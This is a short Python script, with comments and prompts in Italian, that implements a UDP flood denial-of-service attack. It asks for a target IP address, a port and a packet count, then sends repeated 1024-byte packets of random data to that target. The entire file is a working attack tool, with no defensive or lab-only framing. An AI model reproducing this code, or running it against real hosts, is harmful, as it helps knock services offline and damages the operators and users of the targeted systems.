import socket
import random

def genera_pacchetto(dimensione):
    # Genera un pacchetto di dimensione specificata con byte casuali
    return bytes(random.getrandbits(8) for _ in range(dimensione))

def udp_flood(ip_target, porta_target, dimensione_pacchetto, numero_pacchetti):
    # Crea un socket UDP
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    pacchetto = genera_pacchetto(dimensione_pacchetto)
    
    print(f"Inizio invio di {numero_pacchetti} pacchetti a {ip_target}:{porta_target}")
    
    for _ in range(numero_pacchetti):
        try:
            sock.sendto(pacchetto, (ip_target, porta_target))
        except Exception as e:
            print(f"Errore durante l'invio del pacchetto: {e}")
            break
    
    print("Inondazione completata.")

if __name__ == "__main__":
    ip_target = input("Inserisci l'indirizzo IP target: ")
    porta_target = int(input("Inserisci la porta target: "))
    numero_pacchetti = int(input("Inserisci il numero di pacchetti da inviare: "))
    
    udp_flood(ip_target, porta_target, 1024, numero_pacchetti)

